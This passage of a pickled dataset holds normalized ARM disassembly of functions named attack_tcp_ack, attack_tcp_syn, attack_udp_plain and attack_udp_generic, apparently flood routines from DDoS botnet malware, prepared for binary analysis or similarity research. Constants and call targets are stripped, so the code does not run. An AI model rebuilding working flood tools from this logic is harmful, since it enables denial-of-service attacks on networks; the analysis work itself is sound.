2\nMOV~R6,0\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p212
L1964L
tp213
a(S'attack_tcp_ack'
p214
S'"STMFD~SP!,{R4-R11,LR}\nAND~R0,R0,0\nSUB~SP,SP,0\nMOV~R9,R1\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R12,R0,LSL0\nLDR~R3,<STR>\nMOV~R1,R5\nMOV~R0,R4\nMOV~R11,R12,LSR0\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nMOV~R12,R0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nAND~R8,R12,0\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R2,0\nMOV~R3,0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,R2\nMOV~R1,R5\nMOV~R7,R0\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nLDR~R3,[R3]\nMOV~R2,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nMOV~R10,R0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nBNE~FOO\nMOV~R0,R10\nBL~FOO\nB~FOO\nMOV~R1,0\nLDR~R0,<STR>\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R6,[R1,R3,LSL0]\nLDRB~R3,[R6]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R6]\nLDR~LR,[SP,0]\nLDRB~R0,[R6]\nADD~R2,R7,0\nAND~R1,LR,0\nMOV~R2,R2,LSL0\nMOV~R12,LR,LSR0\nBIC~R0,R0,0\nORR~R12,R12,R1,LSL0\nMOV~R3,R2,LSR0\nORR~R0,R0,0\nLDR~LR,[SP,0]\nMOV~R1,R12,ASR0\nSTRB~R0,[R6]\nAND~R3,R3,0\nMOV~R2,R2,LSR0\nSTRB~R1,[R6,0]\nORR~R2,R2,R3,LSL0\nLDR~R1,[SP,0]\nMOV~R3,R2,ASR0\nCMP~LR,0\nSTRB~R1,[R6,0]\nSTRB~R3,[R6,0]\nMOVNE~R3,0\nSTRNEB~R3,[R6,0]\nSTRB~R2,[R6,0]\nMOVNE~R3,0\nLDR~R2,[SP,0]\nSTRNEB~R3,[R6,0]\nMOV~R3,0\nSTRB~R3,[R6,0]\nSTRB~R2,[R6,0]\nLDR~R2,[SP,0]\nADD~R3,R3,0\nMLA~R3,R2,R3,R9\nLDR~LR,[SP,0]\nLDR~R1,[SP,0]\nSTR~LR,[R6,0]\nMOV~R4,R1,LSR0\nLDR~R2,[R3,0]\nAND~R3,R1,0\nORR~R4,R4,R3,LSL0\nSTRB~R12,[R6,0]\nSTR~R2,[R6,0]\nSTRB~R4,[R6,0]\nADD~R5,R6,0\nLDR~LR,[SP,0]\nLDRB~R3,[R5,0]\nAND~R2,LR,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R5,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDR~LR,[SP,0]\nLDRB~R3,[R5,0]\nAND~R2,LR,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R5,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDR~R2,[SP,0]\nAND~R3,R11,0\nMOV~LR,R11,LSR0\nORR~LR,LR,R3,LSL0\nLDRB~R12,[R5,0]\nLDRB~R0,[R5,0]\nLDR~R3,[SP,0]\nMOV~R1,R2,LSL0\nMOV~R2,R1,LSR0\nAND~R2,R2,0\nBIC~R0,R0,0\nAND~R3,R3,0\nMOV~R1,R1,LSR0\nBIC~R12,R12,0\nSTR~R3,[SP,0]\nORR~R1,R1,R2,LSL0\nORR~R3,R3,R0\nMOV~R2,LR,ASR0\nORR~R12,R12,0\nMOV~R4,R4,ASR0\nSTRB~R2,[R5,0]\nSTR~R1,[R5,0]\nSTRB~R12,[R5,0]\nSTRB~R3,[R5,0]\nSTRB~LR,[R5,0]\nSTRB~R4,[R5,0]\nBL~FOO\nCMP~R8,0\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nLDRNEB~R3,[R5,0]\nORRNE~R3,R3,0\nSTRB~R0,[R5,0]\nSTRNEB~R3,[R5,0]\nADD~R0,R6,0\nMOV~R1,R7\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nLDR~LR,[SP,0]\nCMP~R4,LR\nBLT~FOO\nMOV~R3,0\nB~FOO\nMOV~R8,0\nMLA~R2,R0,R8,R9\nLDR~R1,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R1,R0,LSL0]\nCMP~R3,0\nADD~R6,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R8,R9\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR8\nORR~R2,R2,R4,LSRR8\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR8\nORR~R3,R3,R2,LSRR8\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R4,<STR>\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nLDR~LR,[SP,0]\nCMP~LR,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R6,0]\nCMP~R11,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R6,0]\nSTRB~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R4\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nADDNE~R0,R5,0\nMOVNE~R1,R7\nBLNE~FOO\nMOV~R4,0\nMOV~R1,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nBL~FOO\nADD~R3,R7,0\nMOV~R2,R3,LSL0\nMOV~R1,R2,LSR0\nMOV~R12,R0,ASR0\nAND~R1,R1,0\nMOV~R2,R2,LSR0\nSTRB~R12,[R5,0]\nSTRB~R0,[R5,0]\nORR~R2,R2,R1,LSL0\nSTRB~R4,[R6,0]\nMOV~R1,R6\nSTRB~R4,[R6,0]\nMOV~R0,R5\nBL~FOO\nLDR~R3,[SP,0]\nMLA~R12,R3,R8,R9\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDR~R3,[R5,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nSTRB~R3,[R12,0]\nMOV~R1,R5\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R0,R10\nMOV~R12,0\nADD~R2,R7,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~LR,[SP,0]\nCMP~R0,LR\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p215
L1628L
tp216
a(S'attack_tcp_syn'
p217
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nAND~R0,R0,0\nSTR~R1,[SP,0]\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nLDR~R3,[R3]\nMOV~R2,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nMOV~R11,R0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nBNE~FOO\nMOV~R0,R11\nBL~FOO\nB~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R8,[R1,R3,LSL0]\nLDRB~R3,[R8]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R8]\nLDR~R3,[SP,0]\nLDRB~R2,[R8]\nMOV~R1,R3,LSR0\nBIC~R2,R2,0\nAND~R3,R3,0\nORR~R1,R1,R3,LSL0\nORR~R2,R2,0\nLDR~R5,[SP,0]\nMOV~R0,R1,ASR0\nSTRB~R2,[R8]\nSTRB~R0,[R8,0]\nLDR~R0,[SP,0]\nSTRB~R0,[R8,0]\nSTRB~R1,[R8,0]\nLDR~R1,[SP,0]\nMOV~R7,0\nSTRB~R1,[R8,0]\nSTRB~R7,[R8,0]\nCMP~R5,0\nMOV~R3,0\nSTRB~R3,[R8,0]\nLDR~R2,[SP,0]\nADDNE~R3,R3,0\nLDR~R5,[SP,0]\nSTRNEB~R3,[R8,0]\nMOV~R3,0\nMLA~R3,R2,R3,R5\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nSTR~R0,[R8,0]\nMOV~R4,R1,LSR0\nLDR~R2,[R3,0]\nAND~R3,R1,0\nMOV~R9,0\nORR~R4,R4,R3,LSL0\nSTRNEB~R9,[R8,0]\nSTR~R2,[R8,0]\nSTRB~R4,[R8,0]\nSTRB~R9,[R8,0]\nADD~R10,R8,0\nLDR~R5,[SP,0]\nLDRB~R3,[R10,0]\nAND~R2,R5,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R10,0]\nLDR~R0,[SP,0]\nLDRB~R3,[R10,0]\nAND~R2,R0,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R10,0]\nLDR~R1,[SP,0]\nLDRB~R3,[R10,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R10,0]\nLDR~R5,[SP,0]\nLDRB~R3,[R10,0]\nAND~R2,R5,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R10,0]\nLDR~R0,[SP,0]\nLDRB~R3,[R10,0]\nAND~R2,R0,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R10,0]\nLDR~R2,[SP,0]\nLDR~R3,[SP,0]\nLDR~R5,[SP,0]\nLDRB~R12,[R10,0]\nLDRB~R0,[R10,0]\nMOV~R1,R2,LSL0\nMOV~R2,R1,LSR0\nMOV~LR,R3,LSR0\nAND~R3,R3,0\nORR~LR,LR,R3,LSL0\nAND~R2,R2,0\nBIC~R0,R0,0\nAND~R3,R5,0\nMOV~R1,R1,LSR0\nBIC~R12,R12,0\nORR~R1,R1,R2,LSL0\nORR~R3,R3,R0\nMOV~R2,LR,ASR0\nORR~R12,R12,0\nMOV~R6,0\nMOV~R5,0\nMOV~R4,R4,ASR0\nSTRB~R3,[R10,0]\nSTRB~R2,[R10,0]\nSTR~R1,[R10,0]\nSTRB~R12,[R10,0]\nSTRB~LR,[R10,0]\nSTRB~R4,[R10,0]\nSTRB~R6,[R8,0]\nSTRB~R5,[R8,0]\nBL~FOO\nAND~R0,R0,0\nADD~R0,R0,0\nADD~R0,R0,0\nMOV~R0,R0,LSL0\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nORR~R3,R3,R0,LSR0\nMOV~R1,R3,ASR0\nADD~R2,R8,0\nSTRB~R3,[R8,0]\nMOV~R3,0\nSTRB~R1,[R2,0]\nSTRB~R3,[R8,0]\nADD~R3,R3,R6\nSTRB~R3,[R8,0]\nSTRB~R5,[R8,0]\nSTRB~R6,[R8,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,0\nSTRB~R7,[R8,0]\nSTR~R0,[R8,0]\nSTR~R9,[R8,0]\nSTRB~R3,[R8,0]\nSTRB~R2,[R8,0]\nSTRB~R2,[R8,0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nLDR~R0,[SP,0]\nCMP~R4,R0\nBLT~FOO\nMOV~R3,0\nB~FOO\nLDR~R2,[SP,0]\nMOV~R7,0\nMLA~R2,R0,R7,R2\nLDR~R1,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R1,R0,LSL0]\nCMP~R3,0\nADD~R6,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R1,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R7,R1\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR7\nORR~R2,R2,R4,LSRR7\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR7\nORR~R3,R3,R2,LSRR7\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R4,<STR>\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nCMP~R0,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R6,0]\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R6,0]\nSTRB~R0,[R6,0]\nMOV~R4,0\nMOV~R1,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R5\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R12,[SP,0]\nMLA~R12,R3,R7,R12\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDR~R3,[R5,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nSTRB~R3,[R12,0]\nMOV~R1,R5\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R0,R11\nMOV~R12,0\nMOV~R2,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nCMP~R0,R1\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p218
L1652L
tp219
a(S'attack_udp_plain'
p220
S'"STMFD~SP!,{R4-R11,LR}\nAND~R10,R0,0\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R0,R10\nMOV~R1,0\nAND~R4,R2,0\nMOV~R5,R3\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP]\nMOV~R0,R10\nBL~FOO\nLDR~R6,<STR>\nMOV~R1,R5\nMOV~R3,R6\nMOV~R2,0\nMOV~R11,R0\nMOV~R0,R4\nBL~FOO\nMOV~R3,R6\nMOV~R12,R0,LSL0\nMOV~R1,R5\nMOV~R2,0\nMOV~R0,R4\nMOV~R8,R12,LSR0\nBL~FOO\nMOV~R1,R5\nMOV~R7,R0,LSL0\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R2,0\nMOV~R12,R0,LSL0\nMOV~R3,R2\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R3,R0\nAND~R3,R3,0\nADD~R0,SP,0\nMOV~R1,0\nMOV~R2,0\nSTR~R3,[SP,0]\nBL~FOO\nMOV~R4,R7,LSR0\nCMP~R4,R6\nANDNE~R3,R4,0\nMOVNE~R3,R3,LSL0\nORRNE~R6,R3,R7,LSR0\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R6,R0,LSR0\nMOV~R9,0\nLDR~R5,[SP,0]\nMOV~R7,R9\nB~FOO\nBL~FOO\nAND~R3,R8,0\nMOV~R2,R8,LSR0\nORR~R2,R2,R3,LSL0\nLDR~R1,[SP]\nCMP~R8,R4\nMOV~R3,R2,ASR0\nSTR~R0,[R7,R1]\nSTRNEB~R3,[R5,0]\nSTRNEB~R2,[R5,0]\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nMOV~R0,0\nMOV~R2,0\nMOV~R1,R0\nBL~FOO\nCMN~R0,0\nADD~R9,R9,0\nADD~R1,SP,0\nMOV~R2,0\nMOV~LR,0\nMOV~R12,R6,ASR0\nSTR~R0,[R7,R11]\nBEQ~FOO\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R12,[SP,0]\nSTR~LR,[SP,0]\nSTRB~LR,[SP,0]\nSTRB~R6,[SP,0]\nBL~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R5,0]\nBL~FOO\nAND~R2,R4,0\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSL0\nLDRB~R1,[R5,0]\nORR~R2,R2,R4,LSR0\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSL0\nORR~R3,R3,R2,LSR0\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R0,[R7,R11]\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nADD~R7,R7,0\nADD~R5,R5,0\nLDR~R4,<STR>\nCMP~R9,R10\nMOV~R1,0\nMOV~R0,R4\nBLT~FOO\nMOV~R6,0\nMOV~R5,R6\nB~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nLDR~R3,[SP]\nLDR~R4,[R5,R3]\nMOVNE~R0,R4\nBLNE~FOO\nLDR~R0,[R5,R11]\nMOV~R1,R4\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nADD~R5,R5,0\nCMP~R6,R10\nLDR~R1,[SP,0]\nADD~R6,R6,0\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p221
L600L
tp222
a(S'attack_udp_generic'
p223
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nAND~R0,R0,0\nSTR~R1,[SP,0]\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R2,0\nMOV~R3,R2\nMOV~R6,R0,LSL0\nMOV~R1,R5\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nLDR~R3,[R3]\nMOV~R2,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[SP,0]\nMOV~R6,R6,LSR0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nCMP~R6,R3\nMOVCC~R8,R6\nMOVCS~R8,R3\nBL~FOO\nCMN~R0,0\nMOV~R11,R0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[SP,0]\nBNE~FOO\nMOV~R0,R11\nBL~FOO\nB~FOO\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R5,[R1,R3,LSL0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nADD~R2,R8,0\nADD~R3,SP,0\nLDMIA~R3,{R3,R6}\nMOV~R2,R2,LSL0\nMOV~R0,R2,LSR0\nADD~R1,R8,0\nAND~R12,R3,0\nMOV~R1,R1,LSL0\nMOV~R2,R2,LSR0\nAND~R0,R0,0\nMOV~R4,R3,LSR0\nMOV~LR,R6,LSR0\nAND~R3,R6,0\nORR~LR,LR,R3,LSL0\nORR~R6,R2,R0,LSL0\nMOV~R3,R1,LSR0\nLDR~R2,[SP,0]\nLDRB~R0,[R5]\nAND~R3,R3,0\nMOV~R1,R1,LSR0\nORR~R4,R4,R12,LSL0\nORR~R1,R1,R3,LSL0\nMOV~R12,R2,LSR0\nBIC~R0,R0,0\nAND~R2,R2,0\nMOV~R3,R1,ASR0\nORR~R12,R12,R2,LSL0\nORR~R0,R0,0\nSTR~R3,[SP,0]\nMOV~R2,R12,ASR0\nLDR~R3,[SP,0]\nSTRB~R0,[R5]\nSTRB~R2,[R5,0]\nLDR~R2,[SP,0]\nLDR~R0,[SP,0]\nSTRB~R2,[R5,0]\nCMP~R3,0\nLDR~R3,[SP,0]\nSTRB~R3,[R5,0]\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nLDR~R2,[SP,0]\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nADD~R3,R3,0\nMLA~R3,R2,R3,R0\nLDR~R0,[SP,0]\nSTR~R0,[R5,0]\nLDR~R3,[R3,0]\nSTRB~R1,[R5,0]\nMOV~R10,R4,ASR0\nADD~R1,R5,0\nMOV~R9,LR,ASR0\nMOV~R7,R6,ASR0\nADD~R2,R2,0\nSTRB~R12,[R5,0]\nSTR~R3,[R5,0]\nSTRB~R4,[R5,0]\nSTR